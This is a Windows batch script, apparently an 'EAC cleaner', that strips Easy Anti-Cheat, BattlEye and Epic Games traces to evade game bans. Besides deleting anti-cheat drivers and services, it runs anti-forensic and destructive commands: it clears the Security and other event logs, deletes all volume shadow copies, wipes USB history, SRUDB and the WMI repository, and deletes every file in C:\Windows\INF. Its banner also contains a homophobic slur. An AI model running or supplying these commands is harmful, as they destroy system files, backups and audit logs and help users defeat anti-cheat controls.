@echo off
title  EAC CLEANER Made By @UltraWolf9111
echo.
:: ============================
:: FULL REGISTRY TRACE REMOVAL
:: ============================

echo [*] Purging Epic Cuz Fuck Them Faggots

:: --- Epic Games Launcher ---
reg delete "HKCU\Software\Epic Games" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Epic Games" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Epic Games" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKCU\Software\Epic Games\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Epic Games\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Epic Games\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\EpicGamesLauncher*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing\EpicGamesLauncher*" /f >nul 2>&1
:: --- Fortnite ---
reg delete "HKCU\Software\Epic Games\Fortnite" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Epic Games\Fortnite" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\FortniteClient*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing\FortniteClient*" /f >nul 2>&1
:: --- Easy Anti-Cheat (EAC) ---
reg delete "HKLM\SOFTWARE\EasyAntiCheat" /f >nul 2>&1
reg delete "HKCU\Software\EasyAntiCheat" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EAC" /f >nul 2>&1
reg delete "HKLM\SYSTEM\ControlSet001\Services\EAC" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\EasyAntiCheat*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing\EasyAntiCheat*" /f >nul 2>&1
:: --- BattlEye ---
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\BEService" /f >nul 2>&1
reg delete "HKLM\SYSTEM\ControlSet001\Services\BEService" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\BattlEye" /f >nul 2>&1
reg delete "HKCU\Software\BattlEye" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\BattlEye" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\BEService*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing\BEService*" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\BattlEye" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\BattlEye" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Epic Games\Unreal Engine" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Epic Games\Unreal Engine" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Classes\Installer\Products" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "FortniteClient" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EpicGamesLauncher" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\*Cheat*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\Crash*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Tracing\Unreal*" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing\Crash*" /f >nul 2>&1
attrib -h -s -r "%LOCALAPPDATA%\*" /S /D >nul 2>&1
attrib -h -s -r "%APPDATA%\*" /S /D >nul 2>&1
attrib -h -s -r "%PROGRAMDATA%\*" /S /D >nul 2>&1
attrib -h -s -r "%TEMP%\*" /S /D >nul 2>&1
attrib -h -s -r "C:\Users\Public\*" /S /D >nul 2>&1
del /f /s /q "C:\Windows\System32\drivers\EasyAntiCheat.sys" >nul 2>&1
rmdir /s /q "%APPDATA%\EasyAntiCheat" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\EasyAntiCheat" >nul 2>&1
rmdir /s /q "C:\ProgramData\EasyAntiCheat" >nul 2>&1
rmdir /s /q "C:\Users\Public\Public Documents\EAC" >nul 2>&1
rmdir /s /q "C:\Program Files (x86)\EasyAntiCheat" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\BattlEye" >nul 2>&1
rmdir /s /q "%APPDATA%\BattlEye" >nul 2>&1
rmdir /s /q "C:\ProgramData\BattlEye" >nul 2>&1
rmdir /s /q "C:\Program Files\Common Files\BattlEye" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\FortniteGame" >nul 2>&1
rmdir /s /q "%APPDATA%\FortniteGame" >nul 2>&1
rmdir /s /q "%USERPROFILE%\Documents\Epic Games" >nul 2>&1
rmdir /s /q "%PROGRAMDATA%\Epic" >nul 2>&1
rmdir /s /q "%APPDATA%\Epic" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\EpicGamesLauncher" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\UnrealEngine" >nul 2>&1
rmdir /s /q "%APPDATA%\Unreal Engine" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\FortniteGame\Saved\Logs\*.log" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\EpicGamesLauncher\Saved\Logs\*.log" >nul 2>&1
del /f /s /q "%TEMP%\*.log" >nul 2>&1
del /f /s /q "%TEMP%\*.tmp" >nul 2>&1
del /f /s /q "%TEMP%\*epic*" >nul 2>&1
rmdir /s /q "%TEMP%\Epic*" >nul 2>&1
rmdir /s /q "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations" >nul 2>&1
del /f /q "C:\Windows\Prefetch\EASYANTICHEAT*.pf" >nul 2>&1
del /f /q "C:\Windows\Prefetch\FORTNITE*.pf" >nul 2>&1
del /f /q "C:\Windows\Prefetch\EPIC*.pf" >nul 2>&1
rd /s /q "C:\$Recycle.Bin" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
del /f /s /q "C:\ProgramData\Microsoft\Windows\WER" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\WER" >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl System >nul 2>&1
rmdir /s /q "%WINDIR%\System32\wbem\Repository" >nul 2>&1
del /f /q "%ProgramData\Microsoft\Windows\ClipSVC\Token" >nul 2>&1
del /f /q "%ProgramData\Microsoft\Windows\ClipSVC\*" >nul 2>&1
del /f /q "%ProgramData\Microsoft\Windows\DeliveryOptimization\*" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\WindowsNoEditor" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\EpicGamesLauncher\Saved\Crashes" >nul 2>&1
rmdir /s /q "%LOCALAPPDATA%\EpicGamesLauncher\Saved\SaveGames" >nul 2>&1
rmdir /s /q "%APPDATA%\Local\EpicGamesLauncher\Saved" >nul 2>&1
del /s /q "%TEMP%\*" >nul 2>&1
del /s /q "%WINDIR%\Temp\*" >nul 2>&1
del /f /s /q "%TEMP%\*" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Temp\*" >nul 2>&1
del /f /s /q "%WINDIR%\Temp\*" >nul 2>&1
del /f /s /q "%PROGRAMDATA%\NVIDIA Corporation\ShadowPlay\CaptureCore.log" >nul 2>&1
del /f /s /q "%PROGRAMDATA%\NVIDIA Corporation\NvTelemetry\*" >nul 2>&1
del /f /s /q "%PROGRAMDATA%\Microsoft\Windows\DeviceMetadataCache\*" >nul 2>&1
del /f /s /q "%WINDIR%\System32\config\systemprofile\AppData\Local\Microsoft\XboxLive\AuthStateCache.dat" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Microsoft\XboxLive\AuthStateCache.dat" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalCache\*" >nul 2>&1
del /f /s /q "%PROGRAMDATA%\Microsoft\Diagnosis\ETLLogs\*" >nul 2>&1
del /f /s /q "%WINDIR%\System32\LogFiles\WMI\*" >nul 2>&1
del /f /s /q "%WINDIR%\System32\winevt\Logs\*" >nul 2>&1
takeown /f "%WINDIR%\System32\sru\SRUDB.dat" >nul 2>&1
icacls "%WINDIR%\System32\sru\SRUDB.dat" /grant administrators:F >nul 2>&1
del /f /q "%WINDIR%\System32\sru\SRUDB.dat" >nul 2>&1
del /f /s /q "%PROGRAMDATA%\Microsoft\Diagnosis\*.etl" >nul 2>&1
del /f /s /q "%WINDIR%\System32\WDI\*" >nul 2>&1
echo [*] Deleting USB and hardware container history...
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USB" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\SWD\WPDBUSENUM" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\ROOT\SYSTEM" /f >nul 2>&1
del /f /s /q "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1
del /f /s /q "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /f /s /q "%APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\iconcache_*.db" >nul 2>&1
del /f /s /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\*" >nul 2>&1
wevtutil cl "Application" >nul 2>&1
wevtutil cl "Security" >nul 2>&1
wevtutil cl "Setup" >nul 2>&1
wevtutil cl "System" >nul 2>&1
wevtutil cl "Windows PowerShell" >nul 2>&1
wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Application-Experience/Program-Inventory" >nul 2>&1
wevtutil cl "Microsoft-Windows-Application-Experience/Program-Telemetry" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Auditing" >nul 2>&1
wevtutil cl "Microsoft-Windows-WinINet-Config/ProxyConfigChanged" >nul 2>&1
wevtutil cl "Microsoft-Windows-Eventlog" >nul 2>&1
wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Auditing" >nul 2>&1
wevtutil cl "Microsoft-Windows-Eventlog" >nul 2>&1
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\com.epicgames.launcher" /f"
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache" /f"
taskkill /f /im FortniteClient-Win64-Shipping_EAC_EOS.exe
taskkill /f /im FortniteClient-Win64-Shipping_BE.exe
taskkill /f /im FortniteLauncher.exe
taskkill /f /im FortniteClient-Win64-Shipping.exe
taskkill /f /im EpicGamesLauncher.exe
taskkill /f /im UnrealCEFSubProcess.exe
taskkill /f /im EasyAntiCheat.exe
Sc stop EasyAntiCheat
Sc stop FortniteClient-Win64-Shipping_EAC_EOS
Sc stop FortniteClient-Win64-Shipping_EAC
Sc stop FortniteClient-Win64-Shipping_BE
sc stop NvContainerLocalSystem
sc stop NVDisplay.ContainerLocalSystem
taskkill /f /im nvcontainer.exe
taskkill /f /im NVDisplay.Container.exe
taskkill /f /im "NVIDIA Web Helper.exe"
taskkill /f /im "NVIDIA Share.exe"
taskkill /f /im nvsphelper64.exe
taskkill /f /im EpicWebHelper.exe
REG DELETE "HKCU\Software\Microsoft\Direct3D" /v WHQLClass /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_TrackProgs /t REG_DWORD /d 0 /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f
reg add "HKLM\System\CurrentControlSet\Services\Tcpip6\Parameters\DisabledComponents" /v DisabledComponents /t REG_DWORD /d 0xff /f
cmd /C del /s /f /q "C:\Windows\INF\*.*"
cmd /C rmdir /s /q "%systemdrive%\Windows\temp"
cmd /C mkdir "%systemdrive%\Windows\temp"
cmd /C rmdir /s /q "%systemdrive%\Windows\Prefetch"
cmd /C mkdir "%systemdrive%\Windows\Prefetch"
cmd /C del /s /f /q "%systemdrive%\Users\%username%\AppData\Local\IconCache.db"
cmd /C rmdir /s /q "%systemdrive%\Users\%username%\AppData\Local\Microsoft\Windows\WebCache"
cmd /C rmdir /s /q "%systemdrive%\Users\%username%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache"
cmd /C rmdir /s /q "%systemdrive%\Users\%username%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"
cmd /C rmdir /s /q "%systemdrive%\Users\%username%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData"
cmd /C rmdir /s /q "%systemdrive%\ProgramData\NVIDIA Corporation\Drs"
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\tqqMYSLxEtreJTNCMGEpNiFDMT" /f
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\yMhHfJchsflWgfsPKTQayGWtFwi" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{FA99DFC7-6AC2-453A-A5E2-5E2AFF4507BD}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F2A1CB5A-E3CC-4A2E-AF9D-505A7009D442}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{F2A1CB5A-E3CC-4A2E-AF9D-505A7009D442}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CAA59E3C-4792-41A5-9909-6A6A8D32490E}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CAA59E3C-4792-41A5-9909-6A6A8D32490E}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{BCB48336-4DDD-48FF-BB0B-D3190DACB3E2}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{BCB48336-4DDD-48FF-BB0B-D3190DACB3E2}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{B267E3AD-A825-4A09-82B9-EEC22AA3B847}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{B267E3AD-A825-4A09-82B9-EEC22AA3B847}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{A3D53349-6E61-4557-8FC7-0028EDCEEBF6}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{A3D53349-6E61-4557-8FC7-0028EDCEEBF6}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}\Count" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{9E04CAB2-CC14-11DF-BB8C-A2F1DED72085}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\Unreal Engine\Identifiers" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\Unreal Engine\Hardware Survey" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\Unreal Engine" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\EpicGamesLauncher" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\EOS" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXED5C6593B0580A8A0" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXEACF73F79057BCAA0" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXE8D97C7E106019018" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXE4ED52BD9059054A0" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXE4C8CC6BC05834E10" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\RAINBOWSIX.EXE017E2C4C062FBA18" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\OVERWOLFHELPER64.EXE67E9446900028D00" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\OVERWOLFHELPER.EXE67E9446B00023B00" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\MostRecentApplication" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\FC25.EXE67F6CBD8228CEF18" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\FC25.EXE67DE4B6521F63320" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput\DXDIAG.EXE214A433E00042800" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\{931f3cf8-ac22-4e91-9cd3-19b12aee8c5f}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\{8fc64bff-158b-11f0-a11c-af55fb939413}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\CPC\Volume\{931f3cf8-ac22-4e91-9cd3-19b12aee8c5f}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\CPC\Volume\{6b209e49-f73d-48c1-8ec9-6d22dc2de93b}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\CPC\Volume\{04ca6467-5c43-4426-861e-1268373a2cf6}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\CPC\Volume" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\CPC" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ActivityDataModel\Settings" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ActivityDataModel\ReaderRevisionInfo" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ActivityDataModel" /f
reg delete "HKEY_CLASSES_ROOT\com.epicgames.launcher\shell\open\command" /f
reg delete "HKEY_CLASSES_ROOT\com.epicgames.launcher\shell\open" /f
reg delete "HKEY_CLASSES_ROOT\com.epicgames.launcher\shell" /f
reg delete "HKEY_CLASSES_ROOT\com.epicgames.launcher\DefaultIcon" /f
reg delete "HKEY_CLASSES_ROOT\com.epicgames.launcher" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EpicGamesLauncher" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS\UserHelper" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS\UIHelper" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS\RegisteredProducts" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS\MainService" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS\InstallHelper" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games\EOS" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Epic Games" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume\{931f3cf8-ac22-4e91-9cd3-19b12aee8c5f}" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\BitBucket\Volume" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\BitBucket" /f
reg delete "HKEY_USERS\.DEFAULT\Software\Epic Games\Unreal Engine\Identifiers" /f
reg delete "HKEY_USERS\.DEFAULT\Software\Epic Games\Unreal Engine" /f
reg delete "HKEY_USERS\.DEFAULT\Software\Epic Games" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache\Intranet\Home" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache\Intranet" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Users\%USERNAME%\Downloads" /v "spf.exe" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\AppDataLow" /v "rAQBc8Wsa1xVP" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\AppDataLow\Software" /v "DNhm3" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\BranchIO" /v "IDCdJOyapnxr" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\BranchIO\key_live_pfaVQo61xda7Zq1zC1ca3igayxarnljw" /v "JBdT3hVOfoaM" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Chromium" /v "ZYFYZ5B6kzMCk" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Chromium\BLBeacon" /v "fRyilOYGxlSXP" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Chromium\PreferenceMACs" /v "Rblsaqv" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Chromium\StabilityMetrics" /v "CmZFOv" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Chromium\ThirdParty" /v "ZpzRiKYpZgnSOK" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Discord" /v "g5Ayy61" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Discord\Modules" /v "9rklPGtfUR2I" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts" /v "ciQTqVaAUnJv" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\EA Desktop" /v "y4KjsfSX" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Electronic Arts\FC" /v "2u8qvJP3B6Uiu1g" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games" /v "oDUTOX7NY" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\EOS" /v "lvBndn4" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\EpicGamesLauncher" /v "gr881" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Epic Games\Unreal Engine" /v "L1Q4G" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Google" /v "uTlCH9WpIYaPH" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Chrome" /v "ds7HX27KbNC" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Common" /v "pqiwdo3Hrdt6z3" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Update" /v "DtmvWvN20" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Khronos" /v "0OSa9" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Khronos\Vulkan" /v "cKwhz" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft" /v "PYlapdvx" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Accessibility" /v "OwWR2uaAtZV" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Active Setup" /v "nZSCe8nPQH" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\ActiveMovie" /v "jHkpC99I" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\ActiveSync" /v "li9Mk6pyZdA" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Assistance" /v "zchUSmJqhT" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\AuthCookies" /v "kdKB9Ppfr6Sk" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Avalon.Graphics" /v "lyLUl" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Clipboard" /v "08n8Y" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\CommsAPHost" /v "sSXvy" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF" /v "A1KG3aMSFgDmn" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Direct3D" /v "4mMxkcNZ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX Diagnostic Tool" /v "VlvkI3S1W" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Edge" /v "5P1fJX" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\EdgeUpdate" /v "LJwWy0vNK" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\EdgeWebView" /v "YKbBkp7iE8TL" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\EventSystem" /v "zKFZdSKQc" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\F12" /v "tYFpEFl" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Fax" /v "WkhVYO3dJfBuCov" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Feeds" /v "IkbSUz2k4X" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\FTP" /v "SLUcbCkFeXVwVQ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\GameBar" /v "dtm9WgMa" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\GameBarApi" /v "TDHqyzKXoJ" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\IdentityCRL" /v "fRWIz" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\IME" /v "CmfLf8hgMcV" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Input" /v "9GUa8m6xqqEZ1EN" /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\InputMethod" /v "gMnn79" /f
